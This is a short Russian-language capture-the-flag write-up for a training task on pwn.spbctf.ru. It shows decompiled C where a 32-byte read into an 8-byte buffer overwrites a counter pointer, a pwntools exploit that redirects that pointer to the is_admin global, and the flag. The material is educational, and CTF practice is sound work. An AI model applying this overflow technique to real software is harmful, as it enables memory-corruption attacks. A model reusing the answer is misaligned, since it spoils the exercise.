[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc2)
Описание:
Нужно изменить значение is_admin, записав туда не нулевое значение через перееханный указатель
`nc 109.233.56.90 11603`
**[echo_counter](https://pwn.spbctf.ru/files/canary/echo_counter)**

Чтобы получить флаг значение глобальной переменной `is_admin` должно иметь ненулевое значение.
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  int echo_counter; // [rsp+Ch] [rbp-4h] BYREF

  alarm(128u);
  is_admin = 0;

  echo_counter = 0;
  play(&echo_counter);

  if ( is_admin )
    system("cat flag");
}
```

В функции play необходимо переполнить буфер, переписав указатель beep на is_admin.
``` C
void __cdecl play(int *echo_counter)
{
  char buf[8]; // [rsp+1Ch] [rbp-14h] BYREF
  int bs; // [rsp+24h] [rbp-Ch]
  int *beep; // [rsp+28h] [rbp-8h]

  for ( beep = echo_counter; ; ++*beep )
  {
    printf("echo counter [%p] %d\n", beep, *beep);
    bs = read(0, buf, 32u);

    if ( bs == -1 || buf[0] == 'q' )
      break;

    write(1, buf, bs);
  }
}
```

Эксплоит:
``` python
io = start()

payload = b'A' * 8 + p32(3) + p64(0x40408C)
io.sendline(payload)

io.interactive()
```

Запуск:
![{43AA994A-B4F9-4F7D-9FBD-F767BA83DFDA}](../../../../z.%20Images/{43AA994A-B4F9-4F7D-9FBD-F767BA83DFDA}.png)

Ответ: `spbctf{8d37ab5e5c104fec5d1671c4b67cb295}`